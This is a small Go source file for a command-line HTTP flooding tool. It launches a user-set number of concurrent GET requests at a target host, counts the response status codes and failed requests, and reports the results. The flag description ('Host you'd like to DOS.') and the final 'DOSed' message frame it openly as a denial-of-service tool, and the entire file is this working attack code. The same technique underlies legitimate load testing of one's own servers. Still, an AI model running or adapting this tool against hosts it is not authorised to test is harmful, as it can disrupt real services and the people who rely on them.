package main

import (
    "fmt"
    "flag"
    "net/http"
    "sync"
    "sync/atomic"
)

type Counter struct {
	mutex sync.Mutex
	codes  map[int]int
}

func (c *Counter) Inc(code int) {
    c.mutex.Lock()

    if _, ok := c.codes[code]; ok {
        c.codes[code] += 1
    } else {
        c.codes[code] = 1
    }

    c.mutex.Unlock()
}

func (c *Counter) Breakdown() {
    for k, v := range c.codes {
        fmt.Printf("\tStatus Code: %d\tOccurrences: %d\n", k, v)
    }
} 

func main() {
    numRequests := flag.Int("n", 1000, "Number of requests to fire.")
    host := flag.String("d", "", "Host you'd like to DOS.")

    flag.Parse()

    if len(*host) == 0 {
        fmt.Println("-d is required.")
        return
    }

    counter := Counter { codes: make(map[int]int) }

    var wg sync.WaitGroup
    var failedRequests uint64

    for i := 0; i < *numRequests; i++ {
        wg.Add(1)

        go func() {
            defer wg.Done()

            resp, err := http.Get(*host)

            if err != nil {
                atomic.AddUint64(&failedRequests, 1)
                return
            }

            counter.Inc(resp.StatusCode)
            resp.Body.Close()
        }()
    }

    wg.Wait()

    fmt.Println("DOSed ", *host, " with ", *numRequests, " requests.")
    fmt.Println("---")
    fmt.Println("Breakdown:")
    counter.Breakdown()
    fmt.Println("\tFailed requests: ", failedRequests)
    
}
